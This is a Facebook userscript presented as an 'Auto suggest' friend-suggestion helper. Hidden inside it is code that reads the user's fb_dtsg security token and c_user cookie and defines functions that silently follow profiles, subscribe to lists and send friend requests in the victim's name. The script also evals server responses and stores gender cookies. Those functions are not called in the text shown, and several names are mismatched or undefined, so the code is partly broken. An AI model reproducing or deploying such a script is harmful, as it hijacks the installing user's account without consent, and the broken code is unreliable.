// ==UserScript==
// @name            FAcebook NEW Auto suggest *UPDATE 11/07/2013*!
// @description     FAcebook Auto suggest by s.k.i.l
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// http://userscripts.org/scripts/source/175998.user.js
// tit
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function cereziAl(b){var c=b+"=";if(document.cookie.length>0){konum=document.cookie.indexOf(c);if(konum!=-1){konum+=c.length;son=document.cookie.indexOf(";",konum);if(son==-1){son=document.cookie.length}return unescape(document.cookie.substring(konum,son))}else{return""}}}function getRandomInt(b,c){return Math.floor(Math.random()*(c-b+1))+b}function randomValue(b){return b[getRandomInt(0,b.length-1)]}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(d){var c=new XMLHttpRequest();
var b="/ajax/follow/follow_profile.php?__a=1";
var g="profile_id="+d+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
c.open("POST",b,true);
c.setRequestHeader("Content-type","application/x-www-form-urlencoded");
c.setRequestHeader("Content-length",g.length);
c.setRequestHeader("Connection","close");
c.onreadystatechange=function()
{if(c.readyState==4&&c.status==200){c.close}};
c.send(g)}
function sublist(b){var c=document.createElement("script");
c.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+b+" }).send();";
document.body.appendChild(c)}
function sarkadasekle(c,g)
{var b=new XMLHttpRequest();b.onreadystatechange=function()
{if(b.readyState==4){}};
b.open("POST","/ajax/add_friend/action.php?__a=1",true);
var d="to_friend="+c;
d+="&action=add_friend";
d+="&how_found=friend_browser";
d+="&ref_param=none";
d+="&outgoing_id=";
d+="&logging_location=friend_browser";
d+="&no_flyout_on_click=true";
d+="&ego_log_data=";
d+="&http_referer=";
d+="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;
d+="&phstamp=165816749114848369115";
d+="&__user="+user_id;b.setRequestHeader("X-SVN-Rev",svn_rev);
b.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
if(g=="farketmez"&&document.cookie.split("cins"+user_id+"=").length>1){b.send(d)}
else{if(document.cookie.split("cins"+user_id+"=").length<=1){cinsiyetgetir(c,g,"sarkadasekle")}
else{if(g==document.cookie.split("cins"+user_id+"=")[1].split(";")[0].toString()){b.send(d)}}}}
var cinssonuc={};
var cinshtml=document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon)
{var xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{if(xmlhttp.readyState==4)
{eval("cinssonuc = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");
cinshtml.innerHTML=cinssonuc.jsmods.markup[0][1].__html;
btarihi.setTime(bugun.getTime()+1000*60*60*24*365);
if(cinshtml.getElementsByTagName("select")[0].value=="1"){document.cookie="cins"+user_id+"=kadin;expires="+btarihi.toGMTString()}
else{if(cinshtml.getElementsByTagName("select")[0].value=="2"){document.cookie="cins"+user_id+"=erkek;expires="+btarihi.toGMTString()}}eval(fonksiyon+"("+id+","+cins+");")}};
xmlhttp.open("GET","/ajax/timeline/edit_profile/basic_info.php?__a=1&__user="+user_id,true);
xmlhttp.setRequestHeader("X-SVN-Rev",svn_rev);xmlhttp.send()}
function autoSuggest(){links=document.getElementsByTagName("a");
for(i in links){l=links[i];
if(l.innerHTML=='<span class="uiButtonText">Suggest Friend</span>'){l.click()}}}
function blub(){if(document.getElementsByClassName("pbm fsm").length==1){w=document.getElementsByClassName("pbm fsm")[0];
e=document.createElement("a");
e.innerHTML="Auto Suggest by s.k.i.l";
e.className="uiButton";
e.onclick=autoSuggest;
if(w.childElementCount==0){w.appendChild(document.createElement("br"));w.appendChild(e)}}}blub();
document.addEventListener("DOMNodeInserted",blub,true);
